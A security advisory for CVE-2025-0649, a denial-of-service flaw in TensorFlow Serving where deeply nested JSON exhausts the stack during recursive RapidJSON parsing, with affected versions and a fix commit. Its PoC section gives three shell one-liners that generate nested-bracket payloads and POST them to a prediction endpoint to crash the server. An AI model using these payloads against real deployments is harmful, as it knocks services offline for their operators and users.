---
description: CVE-2025-0649 High severity. Tensorflow Serving Stack Exhaustion DoS
title: Tensorflow Serving Stack Exhaustion DoS
date_published: "2025-05-06"
last_updated: "2025-05-06"
xray_id:
vul_id: CVE-2025-0649
cvss: 8.9
severity: high
discovered_by: Ori Hollander
type: vulnerability
---
## Summary
This vulnerability allows unauthenticated remote attackers to cause the server to stop responding to requests due to a stack exhaustion when parsing malformed JSON input

## Component

[Tensorflow Serving](https://github.com/tensorflow/serving)



## Affected versions

(, 2.17.0]



## Description

TensorFlow Serving uses RapidJSON to process JSON input. The function [ParseJson](https://github.com/tensorflow/serving/blob/6e0d7a5f00d15a2d73b8cd3411b6dcbe6b25d0b1/tensorflow_serving/util/json_tensor.cc#L419) in [json-tensor.cc](https://github.com/tensorflow/serving/blob/master/tensorflow_serving/util/json_tensor.cc) uses RapidJSON’s ParseStream function [to parse the JSON input](https://github.com/tensorflow/serving/blob/6e0d7a5f00d15a2d73b8cd3411b6dcbe6b25d0b1/tensorflow_serving/util/json_tensor.cc#L431). The default behavior of RapidJSON’s parsing function is [to parse the input recursively](https://rapidjson.org/md_doc_features.html#Parsing:~:text=Parsing-,Recursive (default),-and iterative parser) with no limit on the recursion depth. A malicious JSON string with an array or object that are deeply nested in each other can cause the server to crash.



## PoC

Run TensorFlow Serving using the instructions in the page: https://www.tensorflow.org/tfx/serving/docker.

Then, run any of the following commands in a shell -

1. ```
   python -c 'print("{\"instances\": [1.0, 2.0, 5.0],\"signature_name\":" + "[" * 500000 + "]" * 500000 + "}")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict
   ```

2. ```
   python -c 'print("{\"instances\": [1.0, 2.0, 5.0],\"signature_name\":" + "[" * 50000 + "]" * 50000 + "}")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict
   ```

3. ```
   python -c 'print("{\"instances\":" + "[" * 50000 + "1" + "]" * 50000 + "}")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict
   ```

The server will crash.



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Fix commit](https://github.com/tensorflow/serving/commit/6cb013167d13f2ed3930aabb86dbc2c8c53f5adf)
